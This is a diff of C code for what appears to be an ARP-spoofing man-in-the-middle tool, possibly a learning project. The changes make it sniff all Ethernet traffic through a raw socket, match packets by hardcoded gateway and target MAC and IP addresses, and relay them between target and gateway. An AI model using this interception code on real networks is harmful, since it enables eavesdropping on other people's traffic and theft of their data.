@@ -8,59 +8,69 @@
     Process the packets that match the desired IP and MAC addresses
 */
 
-int	_mc_handle_received_packet(unsigned char *buffer)
+int	_mc_handle_received_packet(unsigned char *buffer, size_t bytes_read)
 {
-	// The buffer contains the whole packet,
-	// and the firt header in the packet is the ethernet header
-	_mc_g_data.ethernet_header = (struct ethhdr*)buffer;
-
 	// Check if the Ethernet type is ARP
 	// if (ntohs(_mc_g_data.ethernet_header->h_proto) == ETH_P_ARP)
 	// {
 		
 		// The ARP packet is located just after the ethernet header
 		_mc_g_data.packet = (uint8_t *)(buffer);
+		_mc_g_data.packet_size = bytes_read;
+		// The buffer contains the whole packet,
+		// and the firt header in the packet is the ethernet header
+		_mc_g_data.ethernet_header = (struct ethhdr*)buffer;
+
+		// printf("EtherType (raw): 0x%04x\n", ntohs(eth->h_proto));
+		// Check if the EtherType indicates IPv4 (0x0800)
+		if (ntohs(_mc_g_data.ethernet_header->h_proto) != ETH_P_IP)
+		{
+        	// printf("EtherType is not IPv4\n");
+			return 0;
+		}
+		
+        // IP header starts right after the Ethernet header
+        struct iphdr 	*ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
+		uint8_t			*sender_ip = (uint8_t *)&ip->saddr;
+		uint8_t			*dest_ip = (uint8_t *)&ip->daddr;
 
 		// Extract sender MAC address
-		unsigned char* sender_mac	= _mc_g_data.ethernet_header->h_source;
-		unsigned char* dest_mac		= _mc_g_data.ethernet_header->h_dest;
+		unsigned char	*sender_mac	= _mc_g_data.ethernet_header->h_source;
+		unsigned char	*dest_mac	= _mc_g_data.ethernet_header->h_dest;
 		
 		uint8_t gateway_mac[6];
 		_mc_convert_mac_string_to_bytes("cc:fd:17:a6:cc:44 ", gateway_mac);
 	    uint8_t gateway_ip[4];
     	_mc_convert_string_to_byte_ip("192.168.43.1", gateway_ip);
 
+
+
 		// When the source data from the packet matches the data
 		// given through command line, we launch the ARP spoofing
 		if (_mc_memcmp(sender_mac, _mc_g_data.target_mac, ETH_ALEN) == 0
-			&& _mc_memcmp(dest_mac, _mc_g_data.host_mac, ETH_ALEN) == 0)
+			&& _mc_memcmp(sender_ip, _mc_g_data.target_ip, _MC_IPV4_BYTE_SIZE) == 0
+			&& _mc_memcmp(dest_mac, _mc_g_data.host_mac, ETH_ALEN) == 0
+			&& _mc_memcmp(dest_ip, gateway_ip, _MC_IPV4_BYTE_SIZE) == 0)
 		{
 			printf(_MC_YELLOW_COLOR
 				"Matched the target IP and MAC addresses, forwarding to the gateway..."
 				_MC_RESET_COLOR "\n\n");
-			_mc_run_arp_spoofing();
+			printf("EtherType: 0x%04x\n", htons(_mc_g_data.ethernet_header->h_proto));
+
+			_mc_run_arp_spoofing(_MC_PACKET_TO_GATEWAY);
 		}
 		else if (_mc_memcmp(sender_mac, gateway_mac, ETH_ALEN) == 0
-			&& _mc_memcmp(dest_mac, _mc_g_data.host_mac, ETH_ALEN) == 0)
+			&& _mc_memcmp(sender_ip, gateway_ip, _MC_IPV4_BYTE_SIZE) == 0
+			&& _mc_memcmp(dest_mac, _mc_g_data.host_mac, ETH_ALEN) == 0
+			&& _mc_memcmp(dest_ip, _mc_g_data.target_ip, _MC_IPV4_BYTE_SIZE) == 0)
 		{
 			printf(_MC_YELLOW_COLOR
-				"Matched the Gateway IP and MAC addresses, forwarding to the gateway..."
+				"Matched the Gateway IP and MAC addresses, forwarding to the target..."
 				_MC_RESET_COLOR "\n\n");
-			_mc_run_arp_spoofing2();
+			printf("Ethertype: 0x%04x\n", htons(_mc_g_data.ethernet_header->h_proto));
 
+			_mc_run_arp_spoofing(_MC_PACKET_TO_TARGET);
 		}
-
-		// else if (_mc_g_data.verbose == true)
-		// {
-		// 	const char* op_codes[] = _MC_OP_CODE_ARRAY;
-
-		// 	printf(
-		// 		_MC_YELLOW_COLOR "Received an %s, not an ARP request..."
-		// 		_MC_RESET_COLOR "\n\n",
-		// 		op_codes[arop_code - 1]
-		// 	);
-		// }
-	// }
 	return 0;
 }
 
@@ -81,9 +91,9 @@ int	_mc_start_sniffing_paquets(void)
 	// Initial size of the buffer allocated to store src_addr
     socklen_t	addrlen = sizeof(struct sockaddr_ll);
 
-    // Create raw socket for capturing ARP packets,
+    // Create raw socket for capturing every kind of packets,
 	// and save the file descriptor
-    _mc_g_data.raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    _mc_g_data.raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if (_mc_g_data.raw_sockfd == -1)
 	{
         fprintf(stderr, _MC_RED_CROSS " Failed to create raw socket");
@@ -105,9 +115,9 @@ int	_mc_start_sniffing_paquets(void)
 				MSG_DONTWAIT, /* Unblocking mode lets us quit with ctrl C */
 				(struct sockaddr*)&_mc_g_data.src_addr, &addrlen
 		);
-        if (bytes_read > 0 && _mc_handle_received_packet(buffer) == _MC_ERROR) return 1;
+        if (bytes_read > 0 && _mc_handle_received_packet(buffer, bytes_read) == _MC_ERROR) return 1;
 	}
-    // Close the raw socket
-    close(_mc_g_data.raw_sockfd);
+	// Close the raw socket
+	close(_mc_g_data.raw_sockfd);
 	return 0;
 }
